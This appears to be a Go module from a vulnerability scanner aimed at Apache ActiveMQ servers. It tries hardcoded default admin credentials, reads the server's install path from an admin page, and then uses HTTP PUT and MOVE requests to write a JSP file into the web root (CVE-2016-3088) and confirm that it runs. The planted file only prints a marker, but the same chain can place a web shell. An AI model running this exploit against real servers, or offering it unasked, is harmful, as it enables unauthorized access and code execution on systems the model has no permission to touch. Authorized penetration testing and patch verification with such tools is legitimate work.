package DataHandle

import (
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"strings"
	"sync"
)

func CheckUnauth(url string, wg *sync.WaitGroup) {
	defer wg.Done()
	auth := []string{"Basic YWRtaW46MTIzNDU2", "Basic YWRtaW46YWRtaW4="}
	for _, v := range auth {
		head := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36", "Authorization": v}
		resp, body, _ := RequestHead("GET", url+"/admin", nil, head)
		if resp == nil {
			return
		}
		if resp.StatusCode == 200 && strings.Contains(string(body), "ActiveMQ Console") {
			fmt.Printf("[- %v -]存在【ActiveMQ 默认口令漏洞】;\n------------------------------------------------------------------------------\n\n", url)
			CheckPUTFile(url)
		}

	}
}
func CheckPUTFile(url string) {
	var Basedir string
	head := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36", "Authorization": "Basic YWRtaW46YWRtaW4="}
	resp := RequestHeadUnClose("GET", url+"/admin/test/systemProperties.jsp", nil, head)
	if resp == nil {
		return
	}
	html, err := goquery.NewDocumentFromResponse(resp)
	if err != nil {
		fmt.Println("html解析失败", err)
		return
	}
	html.Find("tr td").Each(func(_ int, addr *goquery.Selection) {
		if addr.Text() == "activemq.home" {
			if !strings.Contains(addr.Next().Text(), "../") {
				Basedir = addr.Next().Text()
			}
		} else if addr.Text() == "user.dir" && strings.Contains(addr.Next().Text(), "\\bin") {
			Basedir = strings.Split(addr.Next().Text(), "\\bin")[0]
		}

	})
	header2 := map[string]string{"Destination": "file://" + Basedir + "/webapps/api/s.jsp", "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"}
	RequestHead("PUT", url+"/fileserver/123.txt", strings.NewReader("<%out.print(\"hahahhah1234567890\");%>"), head)
	RequestHead("MOVE", url+"/fileserver/123.txt", nil, header2)
	_, body3, _ := RequestHead("GET", url+"/api/s.jsp", nil, head)
	if strings.Contains(body3, "hahahhah1234567890") {
		//Request := "Step1:" + resqbody1 + "\n\nStep2:" + resqbody2 + "\nStep3:" + resqbody3
		fmt.Printf("[- %v -]存在【ActiveMQ 任意文件写入漏洞（CVE-2016-3088）】;\n\n------------------------------------------------------------------------------\n", url)

	}
}
